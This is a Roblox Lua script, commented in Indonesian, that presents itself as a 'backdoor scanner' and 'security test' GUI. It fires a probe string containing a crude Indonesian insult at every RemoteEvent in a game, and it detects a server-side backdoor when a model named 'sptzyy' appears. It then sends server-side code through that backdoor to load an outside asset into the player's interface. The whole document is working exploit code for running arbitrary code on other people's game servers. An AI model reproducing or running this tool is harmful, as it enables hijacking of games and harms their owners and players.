local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

-- 1. Pembersihan GUI Lama
if CoreGui:FindFirstChild("SptzyySecurityTest") then
    CoreGui.SptzyySecurityTest:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SptzyySecurityTest"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

-- 2. Frame Utama (Bisa Digeser)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -100)
MainFrame.Size = UDim2.new(0, 250, 0, 200)
MainFrame.Active = true
MainFrame.Draggable = true 

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 10)

local UIStroke = Instance.new("UIStroke", MainFrame)
UIStroke.Color = Color3.fromRGB(0, 255, 255)
UIStroke.Thickness = 2

-- 3. Header
local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "BACKDOOR SCANNER"
Title.TextColor3 = Color3.fromRGB(0, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14

-- 4. Tombol Scan (Menggantikan input username karena logikanya otomatis)
local ScanBtn = Instance.new("TextButton", MainFrame)
ScanBtn.Name = "ScanBtn"
ScanBtn.Position = UDim2.new(0.1, 0, 0.3, 0)
ScanBtn.Size = UDim2.new(0.8, 0, 0, 50)
ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 150)
ScanBtn.Text = "START SECURITY SCAN"
ScanBtn.TextColor3 = Color3.white
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.TextSize = 14
Instance.new("UICorner", ScanBtn).CornerRadius = UDim.new(0, 6)

-- 5. Status Label
local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Position = UDim2.new(0.1, 0, 0.65, 0)
StatusLabel.Size = UDim2.new(0.8, 0, 0, 50)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Status: Ready to test game security."
StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 12
StatusLabel.TextWrapped = true

-- 6. Logika Fitur (Sesuai Permintaan)
ScanBtn.MouseButton1Click:Connect(function()
    ScanBtn.Text = "SCANNING..."
    ScanBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    StatusLabel.Text = "Scanning Remotes..."
    
    local modelName = "sptzyy"
    local zyy = nil
    local lastFired = nil
    local payload = "\n KONTOL MESUM😂\n"

    -- Bersihkan model lama jika ada
    for _, obj in ipairs(workspace:GetChildren()) do
        if obj.Name == modelName then
            obj:Destroy()
        end
    end

    -- Listener untuk mendeteksi apakah payload memicu spawn model
    local connection
    connection = workspace.ChildAdded:Connect(function(child)
        if child.Name == modelName and zyy == nil then
            zyy = lastFired
            StatusLabel.Text = "✅ FOUND VULNERABILITY: " .. zyy.Name
            StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
            print("Found zyy!")
            connection:Disconnect()
        end
    end)

    -- Proses Scanning
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(payload)
            end)
            lastFired = remote
            RunService.RenderStepped:Wait()
        end
    end

    task.wait(0.5)

    -- Eksekusi Payload Lanjutan jika celah ditemukan
    if zyy and typeof(zyy) == "Instance" then
        local playerName = Players.LocalPlayer.Name
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        zyy:FireServer(insertPayload)
        StatusLabel.Text = "✅ Test Succeeded: Asset Injected."
    else
        StatusLabel.Text = "❌ No Backdoors Found (Safe)."
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        StarterGui:SetCore("SendNotification", {
            Title = "sptzyy",
            Text = "Security Clean :(",
            Duration = 5,
        })
    end

    if connection then connection:Disconnect() end
    ScanBtn.Text = "RE-SCAN"
    ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 150)
end)
